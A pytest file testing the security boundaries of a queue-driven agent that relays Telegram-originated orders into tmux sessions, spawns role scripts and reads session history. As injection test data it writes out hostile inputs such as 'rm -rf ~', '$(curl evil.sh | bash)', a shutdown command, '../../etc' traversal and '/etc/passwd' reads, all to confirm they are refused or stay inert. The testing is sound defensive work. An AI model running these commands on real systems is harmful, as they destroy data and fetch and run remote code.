"""Tests for runners/mac_agent.py (task-776fbf7e).

Everything is stubbed: no real ssh, no real tmux, no real spawn, no queue file.

The agent drains a queue written by a bot that reads Telegram, so most of these
are security-boundary tests rather than happy-path coverage. The Telegram
allowlist is the first wall; this file pins the second one.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import runners.mac_agent as ma  # noqa: E402

PREFIX = ma.RELAY_PREFIX


class FakeRun:
    """Records every subprocess.run argv, so a test can assert what ran — and,
    crucially, that queue content never became a shell string."""

    def __init__(self, returncode=0, stdout="", stderr=""):
        self.calls: list[list[str]] = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, *a, **kw):
        self.calls.append(list(argv))
        return subprocess.CompletedProcess(
            argv, self.returncode, self.stdout, self.stderr)


# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

def test_relay_entry_reaches_tmux_with_the_right_session_and_text(monkeypatch):
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} ตรวจงานให้หน่อย"})

    assert ok, detail
    argv = fake.calls[-1]
    assert Path(argv[0]).name == "tmux"
    assert argv[1:4] == ["send-keys", "-t", "cto-abc123"]
    assert PREFIX in argv[4]


def test_spawn_entry_invokes_the_right_script_for_the_role(monkeypatch, tmp_path):
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "ROOT", tmp_path)
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "spawn-cto.sh").write_text("#!/bin/bash\n")
    (scripts / "spawn-cxo.sh").write_text("#!/bin/bash\n")

    ok, _ = ma.do_spawn("cto", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cto.sh")

    ok, _ = ma.do_spawn("cfo", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cxo.sh")
    assert fake.calls[-1][1:] == ["--role", "cfo"]


# ---------------------------------------------------------------------------
# security boundary
# ---------------------------------------------------------------------------

def test_security_unknown_kind_is_refused_and_nothing_executes(monkeypatch):
    """An enumerated action list stops being one the moment an unrecognised
    entry gets executed anyway. Unknown kind must fail, never fall back."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, detail = ma.process(
        {"id": 1, "kind": "exec", "target_role": "cto",
         "payload": {"cmd": "rm -rf ~"}})

    assert not ok
    assert "unknown kind" in detail
    assert fake.calls == [], "nothing may run for an unrecognised kind"


@pytest.mark.parametrize("hostile", [
    "; rm -rf ~",
    "$(curl evil.sh | bash)",
    "`whoami`",
    "&& shutdown -h now",
])
def test_security_shell_metacharacters_are_inert_arguments(monkeypatch, hostile):
    """Queue content must never be interpreted. It is passed as ONE argv
    element, so metacharacters stay literal text — assert both that it arrives
    intact and that no shell string was ever built."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    message = f"{PREFIX} {hostile}"
    ok, _ = ma.do_relay("cto", {"message": message})

    assert ok
    argv = fake.calls[-1]
    assert isinstance(argv, list), "argv must be a list, never a shell string"
    assert argv[4] == message, "message must arrive intact as one argument"
    assert sum(1 for part in argv if hostile in part) == 1


def test_security_relay_without_attribution_is_refused(monkeypatch):
    """The [CEO via SomPong] marker is the only thing distinguishing a
    bot-originated order from one the CEO typed. Refuse, never repair."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, detail = ma.do_relay("cto", {"message": "merge everything to main"})

    assert not ok
    assert "attribution" in detail
    assert fake.calls == [], "an unattributed order must not reach tmux"


def test_read_returns_the_pane_tail_and_never_types_anything(monkeypatch):
    """`read` is read-only. It must capture and return, never send-keys —
    otherwise a "show me the screen" request could act on the session."""
    fake = FakeRun(stdout="line1\nline2\nline3\n\n\n")
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, out = ma.do_read("cto", {"lines": 2})

    assert ok
    assert "line2" in out and "line3" in out
    assert "line1" not in out, "should return only the requested tail"
    assert out.startswith("[cto-abc123]"), "must say which session it came from"
    argv = fake.calls[-1]
    assert Path(argv[0]).name == "tmux"
    assert argv[1] == "capture-pane"
    assert "send-keys" not in argv, "read must never type into the session"


def test_read_caps_the_line_count(monkeypatch):
    """An uncapped read is both a cost problem and a way to pull a lot at
    once."""
    fake = FakeRun(stdout="\n".join(f"l{i}" for i in range(5000)))
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, out = ma.do_read("cto", {"lines": 99999})

    assert ok
    assert len(out.splitlines()) <= ma.MAX_READ_LINES


def test_read_rejects_bad_input(monkeypatch):
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")
    ok, detail = ma.do_read("root", {"lines": 10})
    assert not ok and "unknown role" in detail

    ok, detail = ma.do_read("cto", {"lines": "; rm -rf ~"})
    assert not ok and "positive integer" in detail


def test_security_unknown_role_is_refused_for_both_kinds():
    ok, detail = ma.do_relay("root", {"message": f"{PREFIX} hi"})
    assert not ok and "unknown role" in detail

    ok, detail = ma.do_spawn("../../etc", {})
    assert not ok and "unknown role" in detail


# ---------------------------------------------------------------------------
# robustness
# ---------------------------------------------------------------------------

def test_one_failing_entry_does_not_block_the_rest(monkeypatch):
    marked: list[tuple[int, str]] = []
    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 1, "kind": "nope", "target_role": "cto", "payload": {}},
        {"id": 2, "kind": "relay", "target_role": "cto",
         "payload": {"message": f"{PREFIX} ok"}},
    ])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", lambda role, p: (True, "delivered"))

    assert ma.tick() == 2
    assert marked == [(1, "failed"), (2, "done")]


def test_a_raising_handler_is_caught_and_reported(monkeypatch):
    marked: list[tuple[int, str, str]] = []

    def boom(role, payload):
        raise RuntimeError("kaboom")

    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 7, "kind": "relay", "target_role": "cto", "payload": {}}])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s, r)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", boom)

    ma.tick()
    assert marked[0][1] == "failed"
    assert "kaboom" in marked[0][2]


def test_transport_failure_leaves_entries_pending(monkeypatch):
    """A dead VPS must not silently consume work. fetch returns nothing, so
    nothing is marked — the entries are still there on the next tick."""
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (False, "ssh failed"))
    marked = []
    monkeypatch.setattr(ma, "mark", lambda *a: marked.append(a) or True)

    assert ma.fetch_pending() == []
    assert ma.tick() == 0
    assert marked == [], "nothing may be closed when the queue is unreachable"


def test_malformed_queue_rows_are_skipped_not_fatal(monkeypatch):
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (True, "\n".join([
        '1|relay|cto|{"message": "hi"}',
        "garbage-line",
        "2|spawn|cfo|not-json",
    ])))
    rows = ma.fetch_pending()
    assert [r["id"] for r in rows] == [1]


# ---------------------------------------------------------------------------
# terminals / history (task-05ae76f3) — read-only org inspection
# ---------------------------------------------------------------------------

def _fake_row(i: int) -> dict:
    return {
        "host": "mac", "role": "cto", "id": f"{i:06x}", "tmux_name": None,
        "live": i == 0, "attached": False, "glyph": "✅", "state": "pending",
        "summary": f"งานตัวอย่าง {i}", "goal": None, "done": None, "total": None,
        "percent": None, "blocker": None, "created": None,
        "last_active": 1755100000.0 - i, "idle_seconds": 0,
    }


def _inspect_stub(monkeypatch, rows):
    monkeypatch.setattr(ma, "list_sessions", lambda include_closed: list(rows))
    monkeypatch.setattr(ma, "detect_host", lambda: "mac")


def test_terminals_caps_rows_and_says_when_dropped(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(60)])

    ok, result = ma.do_terminals("", {"include_closed": False})

    assert ok
    out = json.loads(result)
    assert out["host"] == "mac"
    assert out["total_sessions"] == 60
    assert len(out["sessions"]) == 50 == ma.MAX_TERMINAL_ROWS
    assert out["dropped"] == 10
    assert "10" in out["note"], "dropped rows must be said out loud"


def test_terminals_no_note_when_nothing_dropped(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(3)])

    ok, result = ma.do_terminals("", {})

    assert ok
    out = json.loads(result)
    assert out["dropped"] == 0
    assert "note" not in out


def test_terminals_passes_include_closed_through_and_validates_it(monkeypatch):
    seen = {}

    def recorder(include_closed):
        seen["ic"] = include_closed
        return []

    monkeypatch.setattr(ma, "list_sessions", recorder)
    monkeypatch.setattr(ma, "detect_host", lambda: "mac")

    ma.do_terminals("", {"include_closed": True})
    assert seen["ic"] is True

    ma.do_terminals("", {})
    assert seen["ic"] is False, "default must be False (what is happening NOW)"

    ok, detail = ma.do_terminals("", {"include_closed": "yes please"})
    assert not ok and "boolean" in detail


def test_terminals_payload_survives_the_result_column(monkeypatch):
    """mark() used to cut `result` at 500 chars, which would have silently
    destroyed every terminals payload (a 50-row snapshot is ~12 KB). Pin the
    fix: the full JSON fits MAX_RESULT_CHARS and lands in the UPDATE."""
    _inspect_stub(monkeypatch, [_fake_row(i) for i in range(50)])

    ok, result = ma.do_terminals("", {})
    assert ok
    assert len(result) > 500, "a real snapshot must be far bigger than the old cap"
    assert json.loads(result)["returned"] == 50, "payload must still be valid JSON"

    sqls = []

    def fake_ssh(sql):
        sqls.append(sql)
        return True, ""

    monkeypatch.setattr(ma, "_ssh_sqlite", fake_ssh)
    assert ma.mark(1, "done", result)
    assert result in sqls[0], "the whole payload must reach the queue row"


def test_mark_still_bounds_a_hostile_giant_result(monkeypatch):
    sqls = []

    def fake_ssh(sql):
        sqls.append(sql)
        return True, ""

    monkeypatch.setattr(ma, "_ssh_sqlite", fake_ssh)
    ma.mark(2, "done", "x" * 100_000)
    assert len(sqls[0]) <= len("x" * ma.MAX_RESULT_CHARS) + 200, \
        "the cap is a bound, not a suggestion"


def test_terminals_entry_flows_through_process(monkeypatch):
    _inspect_stub(monkeypatch, [_fake_row(0)])
    ok, result = ma.process(
        {"id": 1, "kind": "terminals", "target_role": "", "payload": {}})
    assert ok
    assert json.loads(result)["returned"] == 1


def test_history_index_mode_returns_json(monkeypatch):
    monkeypatch.setattr(ma, "history_index",
                        lambda sid: {"host": "mac", "session_id": sid, "counts": {}})

    ok, result = ma.do_history("", {"mode": "index", "session_id": "624111c5"})

    assert ok
    out = json.loads(result)
    assert out["session_id"] == "624111c5"

    ok, result = ma.do_history("", {"mode": "index"})
    assert ok and json.loads(result)["session_id"] is None


def test_history_read_mode_happy_path(monkeypatch):
    monkeypatch.setattr(
        ma, "history_read",
        lambda p, tail_lines: {"status": "ok", "path": p, "text": "tail"})

    ok, result = ma.do_history("", {"mode": "read", "path": "/somewhere/x.log",
                                    "tail_lines": 5})
    assert ok
    out = json.loads(result)
    assert out["status"] == "ok" and out["path"] == "/somewhere/x.log"


def test_history_read_rejection_fails_the_entry(monkeypatch):
    """A refusal is the security boundary doing its job — the queue entry must
    read as failed, never as success-with-a-body."""
    monkeypatch.setattr(
        ma, "history_read",
        lambda p, tail_lines: {"status": "rejected",
                               "reason": "outside ALLOWED_HISTORY_ROOTS"})

    ok, detail = ma.do_history("", {"mode": "read", "path": "/etc/passwd",
                                    "tail_lines": 5})
    assert not ok
    assert "rejected" in detail and "ALLOWED_HISTORY_ROOTS" in detail


def test_history_unknown_mode_fails_and_executes_nothing(monkeypatch):
    calls = []
    monkeypatch.setattr(ma, "history_index",
                        lambda sid: calls.append(("index", sid)) or {})
    monkeypatch.setattr(ma, "history_read",
                        lambda p, tail_lines: calls.append(("read", p)) or {})

    ok, detail = ma.do_history("", {"mode": "delete", "path": "/etc/passwd"})

    assert not ok
    assert "unknown mode" in detail
    assert calls == [], "an unknown mode must dispatch nowhere"


def test_history_validates_payload_shapes(monkeypatch):
    monkeypatch.setattr(ma, "history_index", lambda sid: {"counts": {}})
    monkeypatch.setattr(ma, "history_read",
                        lambda p, tail_lines: {"status": "ok"})

    ok, d = ma.do_history("", {"mode": "read", "tail_lines": 5})
    assert not ok and "path" in d

    ok, d = ma.do_history("", {"mode": "read", "path": "x.log", "tail_lines": 0})
    assert not ok and "positive integer" in d

    ok, d = ma.do_history("", {"mode": "read", "path": "x.log", "tail_lines": True})
    assert not ok and "positive integer" in d

    ok, d = ma.do_history("", {"mode": "index", "session_id": 42})
    assert not ok and "string" in d


def test_terminals_and_history_are_registered_kinds():
    assert ma.HANDLERS["terminals"] is ma.do_terminals
    assert ma.HANDLERS["history"] is ma.do_history
    assert set(ma.HANDLERS) == {"relay", "spawn", "read", "terminals", "history"}
